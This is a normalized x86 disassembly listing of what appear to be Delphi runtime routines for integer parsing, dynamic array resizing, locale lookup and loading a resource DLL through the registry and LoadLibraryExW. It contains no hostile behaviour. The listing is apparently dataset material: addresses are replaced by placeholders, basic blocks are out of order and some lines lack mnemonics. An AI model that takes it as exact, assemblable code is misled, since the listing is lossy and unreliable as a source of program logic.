mov [ fs : eax ] esp
mov edi 0x1
xor esi esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
cmp [ eax + edi * 2 - 0x2 ] 0x20
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
jmp r-xdata
inc edi
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408745
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ eax + edi * 2 - 0x2 ] 0x2d
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x11 ] 0x1
inc edi
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp [ eax + edi * 2 - 0x2 ] 0x2b
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc edi
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp [ eax + edi * 2 - 0x2 ] 0x24
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
movzx edx [ eax + edi * 2 - 0x2 ]
movzx ecx [ eax + edi * 2 - 0x2 ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
cmp dx 0x58
sete al
movzx edx [ eax + edi * 2 - 0x2 ]
and dx 0xffdf
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x30
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edi * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + edi * 2 ]
movzx ecx [ eax + edi * 2 ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + edi * 2 - 0x2 ]
sub esi 0x30
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x30
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp dx 0x58
sete al
jmp r-xdata
movzx edx [ eax + edi * 2 ]
and dx 0xffdf
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
jb r-xdata
inc edi
inc edi
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
je r-xdata
cmp [ ebp - 0x10 ] 0x0
cmp [ ebp - 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
movzx esi cx
sub esi 0x30
jmp r-xdata
add eax 0xfffffff9
sub ax 0x6
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ ebp - 0x10 ] 0xcccccccc
jbe r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
movzx esi cx
sub esi 0x37
jmp r-xdata
add eax 0xffffffe6
sub ax 0x6
jb r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x0
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
setl al
cmp [ ebp - 0x10 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4082a8
push edx
push eax
mov eax esi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
inc edi
xor ebx ebx
jmp r-xdata
jmp r-xdata
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
jb r-xdata
movzx esi cx
sub esi 0x57
jmp r-xdata
mov eax ebx
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
dec edi
cmp al [ ebp - 0x11 ]
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
jmp r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jbe r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
inc edi
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + edi * 2 - 0x2 ]
mov eax ecx
add eax 0xffffffd0
sub ax 0xa
jb r-xdata
sub_408784
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
movzx eax [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x1c ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
sub ebx 0x4
mov eax [ ebp - 0x8 ]
mov edx esi
call sub_40877c
jmp r-xdata
mov al 0x4
call sub_404360
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x20 ] 0x8
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
mov al 0x4
call sub_404360
mov eax edi
imul [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cdq
idiv edi
cmp eax [ ebp - 0x1c ]
je r-xdata
test ebx ebx
je r-xdata
mov al 0x4
call sub_404360
mov [ ebp - 0x24 ] ebx
cmp edi [ ebp - 0x14 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
call sub_404238
mov ebx [ ebp - 0x24 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x20 ]
call sub_404204
mov ebx eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
cmp edi [ ebp - 0x18 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x14 ]
imul edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
imul eax [ ebp - 0x14 ]
add eax ebx
xor ecx ecx
call sub_404c14
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x1c ]
add eax edx
mov ecx [ ebp - 0x14 ]
sub ecx edi
mov edx esi
call j_sub_407e40
test esi esi
je r-xdata
mov [ ebp - 0x18 ] edi
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0xc ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x18 ]
imul ecx [ ebp - 0x1c ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4043c8
mov edx [ ebp - 0x18 ]
imul edx [ ebp - 0x1c ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_404c14
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_408764
jmp r-xdata
inc edi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_408784
inc [ ebp - 0x10 ]
dec edi
jne r-xdata
sub_408928
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_404220
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_407e40
sub_408964
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_408928
pop edx
pop eax
sub_408998
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_402578
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4089c8
push ebx
push esi
add esp 0xfffffdf4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x20c
pop esi
pop ebx
retn
push 0x20a
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_402500
mov eax esp
mov dl 0x1
call sub_409750
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_408a10
push ebx
push esi
push edi
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
mov edi esi
cmp esi [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4089c8
mov edi eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_408c74
push rw-data
call sub_402420
mov [ rw-data ] 0x7f
call sub_4025a0
and eax 0xff
cmp eax 0x6
setae [ rw-data ]
cmp [ rw-data ] 0x0
je r-xdata
retn
push r-xdata
push r-xdata
call sub_402508
push eax
call sub_402510
mov [ rw-data ] eax
push r-xdata
push r-xdata
call sub_402508
push eax
call sub_402510
mov [ rw-data ] eax
push r-xdata
push r-xdata
call sub_402508
push eax
call sub_402510
mov [ rw-data ] eax
sub_408d64
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_408df4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
cmp ebx 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor ebx ebx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax + ebx * 2 - 0x2 ] 0x2d
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
dec ebx
test ebx ebx
jne r-xdata
dec ebx
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408dfb
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_408e04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_408ed7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_407224
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4070fc
mov eax ebx
xor edx edx
call sub_4070a8
jmp r-xdata
mov edx 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408ede
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
inc edx
dec eax
jne r-xdata
push [ ebx ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
mov edx 0x3
call sub_407648
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_408d64
mov ecx eax
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_4070fc
mov ecx [ ebx ]
cmp [ ecx + edx * 2 - 0x2 ] 0x2c
je r-xdata
sub_408ef4
push ebp
mov ebp esp
add esp 0xfffffe94
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x164 ] ecx
mov [ ebp - 0x168 ] ecx
mov [ ebp - 0x16c ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_40905b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_4070a8
cmp si [ rw-data ]
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp si [ rw-data ]
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409062
lea eax [ ebp - 0x16c ]
mov edx 0x3
call j_sub_4068c4
retn
push 0x2
movzx eax si
push eax
call IsValidLocale
test eax eax
je r-xdata
mov edi 0x40
xor eax eax
mov [ ebp - 0xc ] eax
cmp edi [ ebp - 0xc ]
jb r-xdata
push 0x55
lea eax [ ebp - 0xb6 ]
push eax
push 0x59
movzx ebx si
push ebx
call sub_4024f0
push 0x55
lea eax [ ebp - 0x160 ]
push eax
push 0x5a
push ebx
call sub_4024f0
lea eax [ ebp - 0x164 ]
lea edx [ ebp - 0xb6 ]
mov ecx 0x55
call sub_407290
push [ ebp - 0x164 ]
push r-xdata
lea eax [ ebp - 0x168 ]
lea edx [ ebp - 0x160 ]
mov ecx 0x55
call sub_407290
push [ ebp - 0x168 ]
push r-xdata
lea eax [ ebp - 0x16c ]
lea edx [ ebp - 0xb6 ]
mov ecx 0x55
call sub_407290
push [ ebp - 0x16c ]
mov eax [ ebp - 0x8 ]
mov edx 0x5
call sub_407648
mov ebx [ ebp - 0xc ]
add ebx edi
shr ebx 0x1
cmp si [ ebx * 8 + rw-data ]
jae r-xdata
cmp si [ ebx * 8 + rw-data ]
jbe r-xdata
mov edi ebx
dec edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx * 8 + rw-data ]
call sub_408e04
jmp r-xdata
inc ebx
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp edi [ ebp - 0xc ]
jae r-xdata
sub_40908c
push ebp
mov ebp esp
add esp 0xffffffe4
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x6 ] edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_409272
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call sub_402428
movzx eax [ rw-data ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
push rw-data
call sub_402430
mov eax [ ebp - 0x6 ]
xor edx edx
call sub_4070a8
push 0x2
movzx eax [ ebp - 0x2 ]
push eax
call IsValidLocale
test eax eax
je r-xdata
mov eax [ ebp - 0x6 ]
mov edx rw-data
mov ecx 0x55
call sub_407290
push rw-data
call sub_402430
jmp r-xdata
push rw-data
call sub_402428
movzx eax [ ebp - 0x2 ]
mov [ rw-data ] ax
push 0xaa
mov eax [ ebp - 0x6 ]
mov eax [ eax ]
call sub_407134
push eax
push rw-data
call lstrcpynW
push rw-data
call sub_402430
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409279
lea eax [ ebp - 0x1c ]
call j_sub_4068a0
retn
mov edx [ ebp - 0x6 ]
movzx eax [ ebp - 0x2 ]
call sub_408ef4
call GetSystemDefaultUILanguage
cmp ax [ ebp - 0x2 ]
je r-xdata
call [ rw-data ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x2 ]
push eax
call [ rw-data ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4091d3
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x38
call [ rw-data ]
test al al
je r-xdata
mov eax [ ebp - 0x6 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx eax [ ebp - 0x16 ]
push eax
call [ rw-data ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
add eax eax
call sub_404204
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x38
call [ rw-data ]
mov edx [ ebp - 0xc ]
sub edx 0x2
test edx edx
jb r-xdata
call GetSystemDefaultUILanguage
lea edx [ ebp - 0x1c ]
call sub_408ef4
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x6 ]
call sub_4074a4
mov eax [ ebp - 0x6 ]
mov eax [ ebp - 0x6 ]
mov edx r-xdata
call sub_4074a4
mov eax [ ebp - 0x6 ]
retn
mov eax [ ebp - 0x10 ]
call sub_404220
mov eax [ ebp - 0x6 ]
mov edx [ ebp - 0x10 ]
call sub_407254
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 2 ] 0x2c
mov ecx [ ebp - 0x10 ]
cmp [ ecx + eax * 2 ] 0x0
jne r-xdata
sub_409290
push ebx
push esi
mov ebx eax
jmp r-xdata
movzx esi [ ebx ]
test si si
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp si 0x5c
jne r-xdata
push ebx
call sub_402490
mov ebx eax
sub_4092b4
push ebp
mov ebp esp
add esp 0xfffffb94
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_402508
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_402510
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
call lstrcpynW
jmp r-xdata
adc ebx 0x0
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_409290
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynW
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea eax [ esi + 0x2 ]
call sub_409290
mov esi eax
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x2 ]
call sub_409290
mov edi eax
mov eax edi
sub eax esi
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynW
jmp r-xdata
add eax ebx
inc eax
cmp eax 0x105
jg r-xdata
adc eax 0x0
mov ebx esi
sub ebx [ ebp - 0x4 ]
sar ebx 0x1
jns r-xdata
mov eax edi
sub eax esi
sar eax 0x1
jns r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x46a ]
mov edx ebx
add edx edx
add eax edx
push eax
call lstrcpynW
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
call sub_4024d0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
adc eax 0x0
mov eax [ ebp - 0x10 ]
push eax
call sub_4024c8
lea eax [ ebp - 0x234 ]
push eax
call lstrlenW
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov [ ebp + ebx * 2 - 0x46a ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x46a ]
mov edx ebx
add edx edx
add eax edx
add eax 0x2
push eax
call lstrcpynW
lea eax [ ebp - 0x234 ]
push eax
call lstrlenW
inc eax
add ebx eax
mov esi edi
sub_4094b0
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_409695
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x105
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
lea eax [ ebp - 0x21a ]
push eax
call lstrcpynW
push 0x105
lea eax [ ebp - 0x21a ]
push eax
push 0x0
call sub_402500
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40969c
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_402560
test eax eax
je r-xdata
cmp [ ebp - 0x21a ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_409678
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x21a ]
mov edx 0x105
call sub_4092b4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x21a ]
push eax
mov eax [ ebp - 0xc ]
push eax
call sub_402568
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_402560
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_402568
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404204
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x21a ]
push eax
mov eax [ ebp - 0xc ]
push eax
call sub_402568
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_407254
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_402560
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_404204
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_402568
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_407254
lea eax [ ebp - 0xc ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_402560
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_402558
retn
mov eax [ ebp - 0x8 ]
call sub_404220
sub_409750
push ebp
mov ebp esp
add esp 0xfffffde8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi eax
xor eax eax
push ebp
push sub_40980a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
push 0x105
lea eax [ ebp - 0x20e ]
push eax
push 0x0
call sub_402500
lea eax [ ebp - 0x214 ]
mov edx esi
call sub_407254
mov eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x218 ]
lea edx [ ebp - 0x20e ]
mov ecx 0x105
call sub_407290
mov eax [ ebp - 0x218 ]
lea ecx [ ebp - 0x4 ]
pop edx
call sub_409960
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409811
lea eax [ ebp - 0x218 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push 0x2
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call LoadLibraryExW
mov ebx eax
sub_40981c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
lea eax [ ebp - 0x250 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffdf6
push eax
call sub_4024d0
cmp eax 0xffffffff
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_4024c8
sub_409854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4098f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_407134
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov edi ebx
jmp r-xdata
mov [ ebp - 0x5 ] 0x0
movzx esi [ ebx ]
cmp si 0x2c
je r-xdata
cmp [ ebx ] 0x2c
jne r-xdata
test si si
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x214 ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
push eax
call lstrcpynW
mov eax [ ebp + 0x8 ]
push eax
call sub_40981c
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x0
add ebx 0x2
add ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4098f8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_409904
push ebp
mov ebp esp
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x214 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
push eax
push 0x3
call GetUserDefaultUILanguage
movzx eax ax
push eax
call sub_4024f0
mov eax [ ebp + 0x8 ]
push eax
call sub_40981c
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x210 ]
mov [ eax + 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_40981c
pop ecx
test al al
jne r-xdata
xor ebx ebx
sub_409960
push ebp
mov ebp esp
add esp 0xfffffdd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x228 ] ebx
